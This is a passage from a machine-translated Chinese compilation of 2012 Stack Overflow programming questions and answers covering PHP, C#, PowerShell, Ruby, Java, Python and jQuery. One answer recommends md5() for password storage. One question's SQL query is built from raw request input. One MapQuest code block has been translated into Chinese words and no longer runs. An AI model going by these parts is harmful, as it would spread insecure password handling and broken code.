$quantity = $_POST['qty'];
$model = $_POST['mdl'];
$weight = $_POST['wgt'];
$repornew = $_POST['ron'];
$date = $_POST['dob'];
$spec = $_POST['spc'];
$description = $_POST['desc'];
//retreive all values posted by user

if(isset($item_name) || isset($quantity) || isset($model) || isset($weight) || isset($repornew) || isset($date) || isset($spec) || isset($description)){

//send error back to user
} 
```

使用数组或什至 JSON 来解决问题会是一个好主意吗？

我对我需要做什么有了大致的了解，但是将什么用作实现是困扰我的事情。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:37:58.093

```
foreach ($_POST as $key => $value) {
    // ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:41:32.223

要遍历 POST 变量并检查它们是否已提交：

```
$vars = array('item_name','qty','mdl','wgt','ron','dob','spc','desc');
$ok = 1;
foreach ($vars as $value) {
    if (!isset($_POST[$value]])) $ok = 0;
}

if (!$ok) echo 'Not everything is set!';
else echo 'Alright! Everything\'s right!'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T16:42:44.583

您可以这样做的另一种方法：

```
$required_keys = array('keys','you','require');
$entered_keys = array_keys($_POST);

if (count(array_diff($required_keys,$entered_keys)) == 0) {
  // everything entered
} else {
  // something missing
} 
```

# php - 从字符串中只选择一个字符

> ID：12587333
> 
> 赞同：0
> 
> 时间：2012-09-25T16:36:31.607
> 
> 标签：php, string, trim

我有一个字符串变量，看起来像这样：`fasdhkfsdk, 1 sdfs`

字符串中前后字符的数量会有所不同，但逗号和二进制值会一直存在（值会从 1 变为 0）。

我需要一种方法来切掉二进制值左右的所有内容，只留下 1 或 0。两边的字符数量确实发生了变化，所以我认为我不能使用 substr 或爆炸，但我可以是错的

非常感谢

ps 是的，二进制数字前总会有一个逗号和一个空格

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T16:39:14.083

示例 1`sscanf`

```
$string = "fasdhkfsdk, 1 sdfs" ;
$part = sscanf($string, "%s %d %s");
echo $part[1]; 
```

另一个例子`sscanf`

```
$string = "fasdhkfsdk, 1 sdfs" ;
$part = sscanf($string, "%s %d %s",$prifix,$number,$sufix);
print($number); 
```

示例 2`preg_match_all`

```
$string = "fasdhkfsdk, 1 sdfs" ;
preg_match_all('!\d+!', $string, $matches);
print($matches[0][0]); 
```

示例 3`filter_var`

```
$string = "fasdhkfsdk, 1 sdfs" ;
$int = filter_var($string, FILTER_SANITIZE_NUMBER_INT);
print($int); 
```

示例`substr`4`strrpos`

```
//credit: slugonamission

$string = "fasdhkfsdk, 1 sdfs" ;
echo trim(substr($string , strrpos($string,",") + 1 ,2)); 
```

输出

```
 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:39:41.120

你应该试试[正则表达式。](http://php.net/manual/en/function.preg-match.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:40:34.160

你可以像这样使用正则表达式：

```
$string = "fasdhkfsdk, 1 sdfs";
echo preg_replace("[^01]", "", $string); 
```

这将删除除 0 和 1 之外的所有内容，如果您确定字符串只会是字母表中的字符

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T16:41:00.457

试试这个：首先分解字符串，比如 `$r = explode(",",$string)`

然后只需访问数组 $r 的第二部分并获取第二个字符。

```
echo $r[1][1]; 
```

或类似的东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-25T16:42:08.850

你只想要二进制值对吗？你想知道它是 1 还是 0。试试

```
$ar = explode(",", "fasdhkfsdk, 1 sdfs"); // split on the comma
echo(intval($ar[1])); // convert everything after the comma to an int.  should be 0 or 1 
```

# c# - 请让我知道如何加载列表 的第一个数据集值列表

> ID：12587336
> 
> 赞同：0
> 
> 时间：2012-09-25T16:36:50.660
> 
> 标签：c#, asp.net, generics

我正在尝试将值从 a 加载`List<dataset>`到`List<Person>`

我已经编写了以下代码，但不确定下一步该做什么

```
public List<Person> AddressFinderBLL_GetAddressbyName(String pfname,)
{ 
    List<Person> Per= new List<Person>();
    List<DataSet> lstPer = new List<DataSet>(); 
    lstPer = Adal.AddressFinderDAL_GenerateDatabyName(
      pfname, pfnameval, plname, plnameval);
      //here List<Dataset> lstPer loaded with values from back end foreach(DataRow item in lstPer[0].Tables[0].Rows)
{
    // here i need to assign the values to List<Person> from List<Dataset>[0].tables[0].rows; 
} 
```

Person 类具有以下属性 class class Person {

```
 public String _firstname,_middlename;

    public Person()
    {
    }
    public String Firstname
    {
        get
        {
            return _firstname;
        }
        set
        {
            _firstname = value;
        }

    }

    public String Middlename
    {
        get 
        {
            return _middlename;
        }
        set
        {
            _middlename = value;
        }
    } 
```

} 请告诉我

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:47:17.517

我不知道您的 DataSet 有哪些列名，但这是一个近似值：

```
List<Person> pers = lstPer[0].Tables[0].AsEnumerable().
                    Select(r=> new Person() { 
                        FirstName = r.Field<string>("fieldname1"),
                        MiddleName = r.Field<string>("fieldname2")
                    })
                    .ToList(); 
```

顺便说一句，返回数据集列表的方法似乎不太可能。你确定那部分是对的吗？也许它返回一个包含多个表的 DataSet？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:46:38.617

也许（我不知道你表的列）：

```
Per = (from ds in lstPer
      from row in ds.Tables[0].AsEnumerable()
      select new Person(){
          FirstName = row.Field<String>("FirstName"),
          MiddleName = row.Field<String>("MiddleName")
      }).ToList(); 
```

请注意，您需要添加，`using system.Linq`因为上面是一个 linq-query(Linq-To-DataSet)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:48:55.897

全部来自记忆，所以 YMMV 但我希望它是

```
public List<Person> AddressFinderBLL_GetAddressbyName(String pfname,)
{
   List<Person> Per= new List<Person>();
   List<DataSet> lstPer = new List<DataSet>();
   lstPer = Adal.AddressFinderDAL_GenerateDatabyName(pfname, pfnameval, plname, plnameval);
   //here List<Dataset> lstPer loaded with values from back end 
foreach(DataRow item in lstPer[0].Tables[0].Rows)
       {
              // here i need to assign the values to List<Person> from List<Dataset>[0].tables[0].rows; 
          var p = new Person();
//it isn't clear what structure item will have. let's assume that it has 2 columns. one is         //firstname and the other is last name 
          p.FirstName = item[0];
          p.Middlename = item[1];
          Per.Add(p);
       } 
```

但是根据其他答案，您将从围绕 LINQ 的一些阅读中获得更多信息！

# powershell - Powershell 哈希表比较和追加

> ID：12587338
> 
> 赞同：1
> 
> 时间：2012-09-25T16:36:59.063
> 
> 标签：powershell, compare, append, hashtable

我有一个这样的 csv 文件：

```
userid;memberof
user1;groupid1
user2;groupid3
user1;groupid7
user2;groupid8 
```

我想创建一个像这样的 csv 文件：

```
user1;groupid1|groupid7
user2;groupid3|groupid8 
```

我在这个论坛上看到这可以用哈希表来完成，但我无法成功。

我不得不说我是powershell的新手，所以请原谅这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:47:59.767

不需要借口，这是一个非常棘手的;）

```
Import-CSV YourFile.txt -Delim ";" | Group-Object userid | 
   Select-Object @{ name="UserId"
                    expr={$_.Name}},
                 @{ name="MemberOf"
                    expr={($_.Group |% { $_.memberof }) -join "|" }} |
   Export-CSV YourNewFile.txt -Delim ";" -NoTypeInformation 
```

请注意，这将包括标题行“UserId;MemberOf”，因此如果您真的不想要它，那么您应该安排将其砍掉。

使用 ConvertTo-CSV 代替 Export-CSV，将其分配给变量，然后将其写出如下内容：

```
 $output = ... | 
    ConvertTo-CSV -Delim ";" -NoTypeInformation 
 Set-Content YourNewFile.txt $output[1..($output.count)] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:28:59.353

```
$original = Import-Csv .\a.csv -Delimiter ';'
$expression = {[string]::Join('|', ($_.Group | Select -expand memberof))}
$original | Group-Object userid | Select-Object @{n="userid";e={$_.Name}}, @{n="memberof";e=$expression} | Export-Csv ./b.csv -NoTypeInformation -Delimiter ';' 
```

# ruby - if ... eql?... 语句后的奇怪行为

> ID：12587339
> 
> 赞同：1
> 
> 时间：2012-09-25T16:37:01.923
> 
> 标签：ruby

我是 Ruby 新手，正在尝试做一个简单的练习。我需要在数组中找到最长的对称范围。我的代码是：

```
index_start = index_end = nil
max_length = 0
array = [1,2,3,4,5,6,6,5,4,3,2,1]
length = array.length
array.each_with_index do |outer_element, outer_index|
  array.reverse.each_with_index do |inner_element, inner_index|
    if outer_element.eql? inner_element
      end_index = length - 1 - inner_index
      tmp_array = array[outer_index..end_index]
      if tmp_array.eql? tmp_array.reverse and max_length < tmp_array.length
        index_start, index_end = outer_index, end_index
        max_length = tmp_array.length
      end
    end
  end
end
print max_length, "\n"
print index_start,' ', index_end, "\n"
unless max_length.eql? 0
  print array[index_start..index_end]
end 
```

问题是这样的：在内部循环的第二次迭代之后，`inner_index`变量变为等于 11，而它必须为 1，这发生在`if outer_element.eql? inner_element`语句之后。

我对自己做错了什么感到有些困惑。

对不起，我的英语和 Ruby，我都是新手。非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:13:31.800

你错过了一个

```
max_length = tmp_array.length 
```

在您找到一个新的最长对称子阵列的情况下。

使用当前代码，`max_length`始终为 0，并且最后一个元素子数组 ( `[1]`) 是对称的并且比 0 长。

所以代码应该是：

```
...
if tmp_array.eql?tmp_array.reverse and max_length < tmp_array.length
  index_start, index_end = outer_index, end_index
  max_length = tmp_array.length
end
... 
```

# c# - 在 WPF 应用程序中暂停和播放视频

> ID：12587340
> 
> 赞同：0
> 
> 时间：2012-09-25T16:37:04.630
> 
> 标签：c#, wpf

我最近开始研究 C#。

我想要做的是在 10 秒后停止在 WPF 应用程序中播放的视频。我知道我需要某种计时器（DispatcherTimer），但不知道如何使用它。

感谢您在这方面的任何帮助。

XAML 代码：

```
<MediaElement Canvas.Left="20" Canvas.Top ="40"
 Name="VideoControl" LoadedBehavior="Manual" UnloadedBehavior="Stop"  
 MediaOpened="VideoControl_MediaOpened" Source="c:\users\ayymmoo\documents\visual 
 studio 2010\Projects\play_video\play_video\How I Met Your Mother Season 06 Episode 03 
 - Unfinished.avi">
 </MediaElement> 
```

Xaml.cs 代码

```
void PlayClick(object sender, EventArgs e)
{
    VideoControl.Play();
}
void PauseClick(object sender, EventArgs e)
{
    VideoControl.Pause();
}
void StopClick(object sender, EventArgs e)
{
    VideoControl.Stop();
}

private void VideoControl_MediaOpened(object sender, RoutedEventArgs e)
{

} 
```

* * *

我试图用你定义的代码替换我的代码......它第一次工作正常但是当我从暂停位置再次播放时，它在 10 秒前再次暂停，并且当我再次播放时暂停间隔变得更小这又是代码

```
public void PlayClick(object sender, EventArgs e) {

    VideoControl.Play();
    var dispatcherTimer = new System.Windows.Threading.DispatcherTimer();
    dispatcherTimer.Tick += new EventHandler(dispatcherTimer_Tick);
    dispatcherTimer.Interval = new TimeSpan(0, 0, 10);
    dispatcherTimer.Start();
}
private void dispatcherTimer_Tick(object sender, EventArgs e)
    {
        VideoControl.Pause();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:41:13.293

您可以尝试使用此代码

定时器的初始化

```
var  dispatcherTimer = new System.Windows.Threading.DispatcherTimer();
dispatcherTimer.Tick += new EventHandler(dispatcherTimer_Tick);
dispatcherTimer.Interval = new TimeSpan(0,0,10);
dispatcherTimer.Start(); 
```

每个间隔的勾选方法

```
private void dispatcherTimer_Tick(object sender, EventArgs e)
{
 .... 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-14T22:28:09.693

将您的计时器移出这个范围到一个私有字段，在您的构造函数中对其进行初始化，然后在 PlayClick 方法中启动计时器，但不要忘记在 dispatcherTimer_Tick 方法中停止计时器。

我认为您第一次运行计时器时，它可以工作，然后第二次，您创建另一个计时器，但第一个计时器仍然每十秒触发一次，然后恰好在您单击播放第二个之后不到十秒时间。

# sharedpreferences - 在生成包含简单偏好应用程序的应用程序时与 res/xml 文件夹相关的查询

> ID：12587343
> 
> 赞同：2
> 
> 时间：2012-09-25T16:37:10.340
> 
> 标签：sharedpreferences, preferences

从过去 1 个月开始，我开始在 android 上工作，现在在偏好上。任何人都可以告诉我，我们是否必须创建一个 xml 文件夹来在我们的应用程序中编写首选项，因为正如我在少数网站上所引用的那样，有人提到在 res/xml 文件夹中创建文件。

提前谢谢..

# c# - 在运行时分配类属性

> ID：12587344
> 
> 赞同：1
> 
> 时间：2012-09-25T16:37:14.507
> 
> 标签：c#, winforms

假设我有一个`Order`具有诸如 OrderName、OrderNum 等属性的类......

然后用这个类的项目列表填充 a `ComboBox`，假设我这样做：

```
comboBox1.DisplayMember = "OrderName";
comboBox1.ValueMember = "OrderNum";
comboBox1.DataSource = list.ToArray<Order>(); 
```

所以在这里我在代码中硬编码这些字段的名称，例如“OrderName”。有没有更好的方法来做到这一点，而不是硬编码字段的名称？它是否需要某种依赖注入技巧？你有什么建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:21:37.423

如果可能，您可以按照@JesseCSlicer 提到的方式进行操作，但如果您无法更改业务类，则可以采用以下方法：

基于这个[SO answer](https://stackoverflow.com/a/1407625/441860)，我们可以编写自己的助手：

```
public static class PropHelper<T>
{
    public static string PropName<R>(Expression<Func<T,R>> exp)
    {
        var mem = exp.Body as MemberExpression;
        if(mem != null) return mem.Member.Name;     
        throw new ArgumentException("Invlaid Property Name");
    }
} 
```

并使用它：

```
comboBox1.DisplayMember = PropHelper<Order>.PropName(o => o.OrderName);
comboBox1.ValueMember = PropHelper<Order>.PropName(o => o.OrderNum);
comboBox1.DataSource = list.ToArray<Order>(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:55:56.317

下面是我在几个 ASP.NET 应用程序中使用的修改后的类。我在您的示例中分配它的方式是这样的：

```
var orders = model.GetOrders(...);

comboBox1.DisplayMember = OrderQueryResults.DisplayMember;
comboBox1.ValueMember = OrderQueryResults.ValueMember;
comboBox1.DataSource = orders.Results; 
```

班级：

```
public sealed class OrderQueryResults : IOrderQueryResults
{
    private const string DisplayName = "OrderName";

    private const string ValueName = "OrderNum";

    private readonly IEnumerable<IOrderQueryResult> results;

    private readonly object extra;

    private OrderQueryResults(IEnumerable<IOrderQueryResult> results, object extra)
    {
        this.results = results;
        this.extra = extra;
    }

    public string DisplayMember
    {
        get
        {
            return DisplayName;
        }
    }

    public string ValueMember
    {
        get
        {
            return ValueName;
        }
    }

    public IEnumerable<IOrderQueryResult> Results
    {
        get
        {
            return this.results;
        }
    }

    public object Extra
    {
        get
        {
            return this.extra;
        }
    }

    public static IOrderQueryResults Create(IEnumerable<IOrderQueryResult> results, object extra)
    {
        if (results == null)
        {
            throw new ArgumentNullException("results");
        }

        return new OrderQueryResults(results.ToList(), extra);
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-25T16:57:33.373

这些只是 的属性`Order`，对吗？所以你*可以*使用`const`- 这比代码中的文字要好得多 - 但如果你愿意，你当然可以在运行时更改它们。你只需要知道它们是什么。

在您的类中，“OrderName”和“OrderNum”只是表示属性名称的字符串，因此如果您的类中碰巧有其他属性`Order`，您可以获取这些属性的名称并分配它们，例如，从某个用户行动。

如果你愿意，你可以使用反射来检查这个`Order`类。就像是：

```
Type theType =(typeof(Order));
// Get the public properties.
PropertyInfo[] thePropertyInfo =
    theType.GetProperties(BindingFlags.Public|BindingFlags.Instance); 
```

要获取该 PropertyInfo 数组中任何特定属性的名称，您可以执行以下操作：

```
thePropertyInfo[i].Name; 
```

会给你对象中第 i 个属性的名称。

因此，您可以说，将这些属性放入某个列表中，即其本身绑定到一个控件 - 例如 a`ComboBox`然后在运行时选择将使用什么`DisplayMember`，`ValueMember`然后只需设置这些属性，绑定就会自动更新。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T16:47:48.120

最好使用放置在 Order 类中的 const 字符串，并在绑定数据源时在任何地方使用这些常量。

# java - Java 通过套接字接收对象

> ID：12587346
> 
> 赞同：1
> 
> 时间：2012-09-25T16:37:21.683
> 
> 标签：java, sockets, object

我正在为大学开发一个刽子手游戏。它需要通过套接字，带有服务器和客户端。游戏现在运行良好。

但是当它由两个人玩，试图猜测同一个词时，我需要知道一个用户选择了哪个字母，所以我可以在另一个用户 GUI 上禁用该字母。

所以，我正在尝试发送一个带有 id 的字母对象，该 ID 将禁用另一侧的按钮，我首先发送一条消息，警告我将发送一个对象，所以我没有收到异常。

Bur 它只读取我发送的前两个对象，在第三个对象上我得到一个名为**java.io.StreamCorruptedException**的异常。有谁知道为什么？

```
 Sending:
    toClient= new DataOutputStream(socketConection.getOutputStream());
    toClient.writeBytes("VK_Letra\n");
    objectToClient= new ObjectOutputStream(socketConetion.getOutputStream());
    objectToClient.writeObject(new Letter());
    objectToClient.flush();

    Receiving:
    fromServer = new BufferedReader(new InputStreamReader(socketCliente.getInputStream()));
    objectFromServer = new ObjectInputStream(socketCliente.getInputStream());

public void run(){
    String str;
    try{
        while(true){
            str = fromServer.readLine();

            if(str.equals("VK_Letter")){
                Letter l = (Letter) objectFromServer.readObject();
                System.out.println(l.getLetter());
                button[l.getId()].setEnabled(false);
            }else{
                chat.append(str+ "\n");
                chat.setCaretPosition(chat.getDocument().getLength());
            }
        }
    }catch(IOException | ClassNotFoundException e){
        JOptionPane.showMessageDialog(/* Error Message */);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:57:37.563

我将使用的方法是将所有内容都作为对象，以便您只发送和接收对象。然后该对象将指示实际消息以及任何参数或参数或数据。

您在读取行和获取对象之间混淆。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:58:50.847

一个常见的混淆来源是当您在同一个流上混合不同的流类型时。

你有两个不同问题的一个很好的例子。

*   您不应在同一流上使用多个流，例如 DataOutptuStream 和 ObjectOutputStream
*   不应混合二进制流和文本流，例如 BufferedReader 和 ObjectInputStream。

解决方案是使用一个，并且只有一个，它适合您的需求并使用它。

# python - 具有弹出随机元素的能力的 Python 集

> ID：12587352
> 
> 赞同：25
> 
> 时间：2012-09-25T16:37:51.857
> 
> 标签：python, random, set

我需要一个功能类似于集合（快速插入、删除和成员资格检查）但能够返回随机值的 Python (2.7) 对象。以前在 stackoverflow 上提出的问题的答案如下：

```
import random
random.sample(mySet, 1) 
```

但这对于大型集合来说非常慢（它在 O(n) 时间内运行）。

其他解决方案不够随机（它们依赖于 python 集的内部表示，这会产生一些非常非随机的结果）：

```
for e in mySet:
    break
# e is now an element from mySet 
```

我编写了自己的基本类，它具有恒定时间查找、删除和随机值。

```
class randomSet:
    def __init__(self):
        self.dict = {}
        self.list = []

    def add(self, item):
        if item not in self.dict:
            self.dict[item] = len(self.list)
            self.list.append(item)

    def addIterable(self, item):
        for a in item:
            self.add(a)

    def delete(self, item):
        if item in self.dict:
            index = self.dict[item]
            if index == len(self.list)-1:
                del self.dict[self.list[index]]
                del self.list[index]
            else:
                self.list[index] = self.list.pop()
                self.dict[self.list[index]] = index
                del self.dict[item]

    def getRandom(self):
        if self.list:
            return self.list[random.randomint(0,len(self.list)-1)]

    def popRandom(self):
        if self.list:
            index = random.randint(0,len(self.list)-1)
            if index == len(self.list)-1:
                del self.dict[self.list[index]]
                return self.list.pop()
            returnValue = self.list[index]
            self.list[index] = self.list.pop()
            self.dict[self.list[index]] = index
            del self.dict[returnValue]
            return returnValue 
```

有没有更好的实现，或者对这段代码有什么大的改进？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-25T17:25:46.443

我认为最好的方法是[`MutableSet`](https://docs.python.org/3/library/collections.abc.html#collections-abstract-base-classes)在`collections`. 继承自`MutableSet`, 然后定义`add`, `discard`, `__len__,` `__iter__`, 和`__contains__`; 也重写`__init__`为可选地接受一个序列，就像`set`构造函数一样。提供基于这些方法`MutableSet`的所有其他方法的内置定义。`set`这样您就可以`set`廉价地获得完整的界面。（如果您这样做，`addIterable`则为您定义，名称为`extend`。）

`discard`在标准`set`界面中似乎是您在`delete`此处调用的内容。所以重命名`delete`为`discard`. `popRandom`此外，您可以`popRandom`像这样定义，而不是使用单独的方法：

```
def popRandom(self):
    item = self.getRandom()
    self.discard(item)
    return item 
```

这样您就不必维护两个单独的项目删除方法。

最后，在您的项目删除方法中（`delete`现在，`discard`根据标准集接口），您不需要 if 语句。无需测试是否`index == len(self.list) - 1`，只需将列表中的最后一项与要弹出的列表索引处的项交换，并对反向索引字典进行必要的更改。然后从列表中弹出最后一项并将其从字典中删除。无论是否`index == len(self.list) - 1`：

```
def discard(self, item):
    if item in self.dict:
        index = self.dict[item]
        self.list[index], self.list[-1] = self.list[-1], self.list[index]
        self.dict[self.list[index]] = index
        del self.list[-1]                    # or in one line:
        del self.dict[item]                  # del self.dict[self.list.pop()] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T17:20:48.540

您可以采取的一种方法是派生一个新类，从该类`set`中使用派生自`int`.

然后您可以使用`pop`选择一个随机元素，如果它不是 salt 类型，则重新插入并返回它，但如果是 salt 类型，则插入一个新的、随机生成的 salt 对象（并 pop 选择一个新的目的）。

这将倾向于改变选择对象的顺序。平均而言，尝试次数将取决于加盐元素的比例，即摊销的 O(k) 性能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T17:02:18.693

我们不能实现一个新的类继承自`set`一些（hackish）修改，使我们能够以 O(1) 查找时间从列表中检索随机元素吗？顺便说一句，在 Python 2.x 上，您应该继承自`object`，即使用`class randomSet(object)`. PEP8[也是](http://www.python.org/dev/peps/pep-0008/)你需要考虑的 :-)

编辑：为了了解一些骇人听闻的解决方案可能有什么想法，这个线程值得一读： http: [//python.6.n6.nabble.com/Get-item-from-set-td1530758.html](http://python.6.n6.nabble.com/Get-item-from-set-td1530758.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T17:30:57.980

是的，我会以与您几乎相同的方式实现“有序集” - 并使用列表作为内部数据结构。

但是，我会直接从“set”继承，并且只跟踪内部列表中添加的项目（就像您所做的那样） - 并保留我不单独使用的方法。

每当集合通过特定于集合的操作（如 *_update 方法）更新时，可能会添加一个“同步”方法来更新内部列表。

如果使用“有序字典”不涵盖您的用例。（我刚刚发现尝试将 ordered_dict 键转换为常规集合并没有优化，因此如果您需要对数据进行集合操作，那么这不是一个选项）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T05:09:12.203

如果您不介意只支持可比较的元素，那么您可以使用`blist.sortedset`.

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-07-12T00:15:57.890

这是一个从头开始的解决方案，它在恒定时间内添加和弹出。出于演示目的，我还包括了一些额外的集合函数。

```
from random import randint

class RandomSet(object):
  """
  Implements a set in which elements can be
  added and drawn uniformly and randomly in
  constant time.
  """

  def __init__(self, seq=None):
    self.dict = {}
    self.list = []
    if seq is not None:
      for x in seq:
        self.add(x)

  def add(self, x):
    if x not in self.dict:
      self.dict[x] = len(self.list)
      self.list.append(x)

  def pop(self, x=None):
    if x is None:
      i = randint(0,len(self.list)-1)
      x = self.list[i]
    else:
      i = self.dict[x]
    self.list[i] = self.list[-1]
    self.dict[self.list[-1]] = i
    self.list.pop()
    self.dict.pop(x)
    return x

  def __contains__(self, x):
    return x in self.dict

  def __iter__(self):
    return iter(self.list)

  def __repr__(self):
    return "{" + ", ".join(str(x) for x in self.list) + "}"

  def __len__(self):
    return len(self.list) 
```

# ruby-on-rails - 提取字符串中的子字符串

> ID：12587359
> 
> 赞同：0
> 
> 时间：2012-09-25T16:38:08.623
> 
> 标签：ruby-on-rails

我有以下字符串：

expression_patterns_attributes_2_location_attributes_PTN_PATTERN

我只需要提取'expression_patterns_attributes_'之后的数字

我做了以下事情：

```
<%= string_a = "expression_patterns_attributes_2_location_attributes_PTN_PATTERN"
<% z_index1 = string_a.slice! "expression_patterns_attributes_" %>
<% z_index2 = string_a.slice! "_location_attributes_PTN_PATTERN"     %>
<%= string_a %> yields '2' 
```

有没有更简洁的方法从字符串中提取数字？

谢谢你的建议

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:45:13.993

```
s = 'expression_patterns_attributes_2_location_attributes_PTN_PATTERN'
s[/\d+/] # => "2" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:44:20.907

如果您确定 string_a 总是格式正确：

```
string_a.split("_")[3] 
```

# jquery - 为什么我不能使用 jQuery.cookie 插件覆盖 cookie？

> ID：12587364
> 
> 赞同：0
> 
> 时间：2012-09-25T16:38:16.237
> 
> 标签：jquery, cookies

```
alert('You clicked: '+this.currentSortCol);
$.cookie('#'+this.settings.table+'-sortCol',this.currentSortCol);
alert('The cookie is: '+$.cookie('#'+this.settings.table+'-sortCol')); 
```

这段代码工作了一次并最初设置了 cookie。现在，它不会设置 cookie。第一个警报框正确显示了我单击的列的值，第二个警报框仍然显示另一列的值。

# php - 在 SQL 查询中传递密码值？

> ID：12587377
> 
> 赞同：-4
> 
> 时间：2012-09-25T16:39:32.367
> 
> 标签：php

我们如何在 QUERY 中的 PHP 中传递密码。

我正在尝试这样的事情，但出现语法错误。

`$query = "INSERT INTO users (name, username, email, password) VALUES ('".$_REQUEST['fullname']."','".$_REQUEST['userid']."','"$_REQUEST['mailid']."','".$_REQUEST['userpassword']."')";`

上面的代码有一些错误，我无法弄清楚。我相信，密码不能像这样简单地发送。

这是错误：

`Parse error: syntax error, unexpected '$_REQUEST' (T_VARIABLE)`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:41:42.147

错误：

`'"$_REQUEST['mailid']`

改变

`'" . $_REQUEST['mailid']`

和

1.  使用[准备好的语句](http://php.net/manual/en/pdo.prepared-statements.php)将用户接收到的数据插入数据库的更好方法；
2.  使用[md5() PHP 函数](http://php.net/manual/en/function.md5.php)存储密码，不要在未编码的情况下以真实形式存储；

# jquery - 使用 jquery ajax 调用 MapQuest Geocode api

> ID：12587379
> 
> 赞同：0
> 
> 时间：2012-09-25T16:39:34.223
> 
> 标签：jquery, ajax, mapquest

我正在尝试使用 jquery ajax() 来调用 mapquest api，但我不断收到以下错误：

`Statuscode:400`

`"Illegal argument from request: Error parsing JSON from Request: A JSONObject text must begin with '{' at character 0 of , see http://www.mapquestapi.com/geocoding/ for details on correctly formatting locations."`

这是我正在进行的 jquery ajax 调用：

```
$.ajax({
    url: "http://www.mapquestapi.com/geocoding/v1/address?key=<mykey>",
    dataType: 'json',
    type: 'POST',
    contentType:'json',
    data: {json: {location: { "postalCode": "98765"}, options: { thumbMaps: false} } },
    success: function(data) { log( data ) },
    error: function(data) { log( 'error occurred - ' + zipCode + ' - ' + data ) }
}); 
```

我也尝试过`jsonp`作为 dataType ，但我无法正常工作。

url 方法可以正常工作，但捕获返回响应更加困难：

```
http://www.mapquestapi.com/geocoding/v1/address?key=<mykey>&location=89790 
```

任何帮助，将不胜感激。

马特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T22:23:07.003

看起来您在传递位置信息时可能有一组额外的括号。

尝试这个：

```
    $.ajax({
    网址：“http://www.mapquestapi.com/geocoding/v1/address?key=",
    数据类型：'json'，
    类型：'POST'，
    内容类型：'json'，
    数据：{位置：{“postalCode”：“98765”}，选项：{thumbMaps：false}}，
    成功：函数（数据）{日志（数据）}，
    错误：函数（数据）{日志（'发生错误-'+邮政编码+'-'+数据）}
});

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-03T00:26:33.813

这真的是因为你的 json 并不是真正的 json 字符串。您不能像这样将 JSONObject 传递到 url 中。您必须先对其进行字符串化。我遇到了和你一样的错误，在我把它字符串化之后，它就起作用了。它在 IE7 中不起作用，因此您必须使用 JSON2 使其与 ie7 兼容：在此处找到：[json2](https://github.com/douglascrockford/JSON-js)

```
var key = <mykey>;
$.ajax({
    url: "http://www.mapquestapi.com/geocoding/v1/address",
    dataType: 'json',
    type: 'POST',
    contentType:'json',
    data: {
        key: decodeURIComponent(key),
        json : JSON.stringify( 
            {
                location: { "postalCode": "98765"}, options: { thumbMaps: false}
            }) 
    },
    success: function(data) { log( data ) },
    error: function(data) { log( 'error occurred - ' + zipCode + ' - ' + data ) }
}); 
```

# jquery - JQuery：当 .each 具有不同 ID 的父母的孩子时，第一个父母的 ID 仍然存在

> ID：12587386
> 
> 赞同：3
> 
> 时间：2012-09-25T16:39:56.220
> 
> 标签：jquery, parent

所有，我已经尽我所能来解决这个问题，尽管我发现的可能的例子要复杂得多，而且似乎我是唯一一个遇到这个问题的人，所以我来找你帮助，或者只是一个解释。

在下面的代码中，我希望连续看到三个警报，tab-1、tab-2 和 tab-3，但我看到的是 tab-1 的三个警报。为什么会这样？获得预期效果的解决方案可能是什么？

感谢您的时间和帮助。

的HTML

```
<div id="tab-1">
    <span class="test"></span>
</div>
<div id="tab-2">
    <span class="test"></span>
</div>
<div id="tab-3">
    <span class="test"></span>
</div> 
```

jQuery

```
$('.test').each(function() {
    alert($('.test').parent().attr("id"));
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:42:16.657

您对每种语法都有点偏离。

```
$(".test").each(function(index, element) {
    alert($(element).parent().attr("id"));
}); 
```

这使用您正在进行的迭代，而不是再次查询每个测试类并使用第一个。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-25T16:42:18.243

因为您正在查询`$('.test')`而不是使用[`.each()`](http://api.jquery.com/each/)循环中的项目，所以将其更改为此

```
$('.test').each(function() {
    alert($(this).parent().attr("id"));
}); 
```

见这里：http: [//jsfiddle.net/gLh5z/](http://jsfiddle.net/gLh5z/)

